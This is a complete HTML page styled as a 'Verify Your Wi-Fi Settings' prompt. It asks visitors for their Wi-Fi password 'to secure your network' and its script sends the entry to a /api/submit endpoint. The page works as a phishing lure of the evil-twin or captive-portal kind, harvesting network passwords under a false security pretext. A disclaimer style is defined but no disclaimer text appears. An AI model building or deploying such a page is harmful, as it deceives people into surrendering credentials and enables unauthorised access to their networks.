<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Wi-Fi Settings</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 400px;
            text-align: center;
        }
        h1 {
            color: #333;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 20px;
        }
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .disclaimer {
            color: red;
            font-size: 12px;
            margin-top: 20px;
        }
        #response {
            margin-top: 15px;
            color: green;
            font-size: 14px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Verify Your Wi-Fi Settings</h1>
    <p>Please enter your Wi-Fi password to secure your network.</p>
    <form id="wifiForm">
        <input type="password" id="wifiPassword" name="password" placeholder="Enter Wi-Fi Password" required>
        <button type="submit">Submit</button>
    </form>
    <p id="response"></p>
</div>

<script>
    const form = document.getElementById('wifiForm');
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = document.getElementById('wifiPassword').value;

        try {
            const res = await fetch('/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password })
            });
            const data = await res.json();
            document.getElementById('response').innerText = data.message;
            form.reset();
        } catch (err) {
            document.getElementById('response').innerText = 'Error submitting form.';
        }
    });
</script>
</body>
</html>
